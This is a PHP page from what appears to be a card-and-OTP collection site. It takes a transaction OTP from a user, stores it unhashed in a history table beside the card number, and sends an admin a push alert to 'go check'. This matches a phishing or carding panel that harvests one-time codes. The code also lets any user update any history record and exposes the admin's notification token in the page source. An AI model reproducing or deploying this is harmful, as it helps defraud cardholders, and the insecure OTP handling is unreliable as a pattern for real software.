<?php
include '../../component/header.php';

if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'user') {
    header("Location: /no-permission");
    exit();
}
$id_history = $_GET['id'];  // Lấy id_history từ URL
$query = "SELECT h.*, c.card_number FROM tbl_history h 
LEFT JOIN tbl_card c ON h.id_card = c.id_card 
WHERE h.id_history = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param('i', $id_history);
$stmt->execute();
$result = $stmt->get_result();
if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
}

// Kiểm tra xem người dùng đã gửi biểu mẫu chưa
if (isset($_POST['confirm_otp'])) {
    $otp = $_POST['otp'];
    
    // Kiểm tra OTP có hợp lệ không (bạn có thể thêm logic kiểm tra tùy ý)
    if (!empty($otp)) {
        // Cập nhật OTP trong bảng tbl_history
        $query = "UPDATE tbl_history SET otp_transaction = ? WHERE id_history = ?";
        $stmt = $conn->prepare($query);
        $stmt->bind_param('si',$otp, $id_history);

        if ($stmt->execute()) {
            // Nếu cập nhật thành công
            $_SESSION['otp_transaction_success'] = "Nhập OTP giao dịch thành công!";
            header("Location: /user/history");
            exit();
        } else {
            // Nếu cập nhật thất bại
            $_SESSION['otp_transaction_error'] = "Nhập OTP thất bại. Vui lòng thử lại.";
        }
        
        $stmt->close();
    } else {
        $_SESSION['otp_error'] = "Vui lòng nhập OTP hợp lệ.";
    }
}
?>

<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../styles/index.css">
    <link rel="stylesheet" href="../../component/header.css">
    <link rel="stylesheet" href="../../component/sidebar.css">
    <link rel="stylesheet" href="../add-card/addcard.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <title>OTP giao dịch</title>
    <style>
    input,
    select {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
    }
    </style>
</head>

<body>
    <div class="container_boby">
        <?php include '../../component/sidebar.php'; ?>
        <div class="content_right container_form">
            <div class="container">
                <h1 class="title">Nhập OTP giao dịch</h1>
                <!-- Form nhập OTP -->
                <form id="otp-transaction-form" method="post" action="">
                    <label for="otp">Nhập mã OTP:</label>
                    <input type="password" id="otp" name="otp" required>
                    <input type="submit" id="otpTransactionButton" name="confirm_otp" value="Xác Nhận OTP">
                </form>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script>
            document.getElementById('otpTransactionButton').addEventListener('click', function () {
            console.log("aaaaaa");

            fetch('../../component/send.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'token': '<?php echo htmlspecialchars($row["token_admin"]); ?>',
                    'title': 'Thông báo từ bên user',
                    'body': JSON.stringify({
                        'message': 'User vừa nhập OTP giao dịch, bạn hãy vào kiểm tra',
                        'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
                    }),
                    'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
                })
            })
                .then(response => response.text())
                .then(data => {
                    console.log('Success:', data);
                    toastr.success('Thông báo đã được gửi thành công.');
                })
                .catch((error) => {
                    console.error('Error:', error);
                    toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
                });
        });

        $(document).ready(function() {
            <?php if (isset($_SESSION['otp_transaction_error'])): ?>
                toastr.error("<?php echo $_SESSION['otp_transaction_error']; ?>");
                <?php unset($_SESSION['otp_transaction_error']); ?>
            <?php endif; ?>
        });
    </script>
</body>

</html>
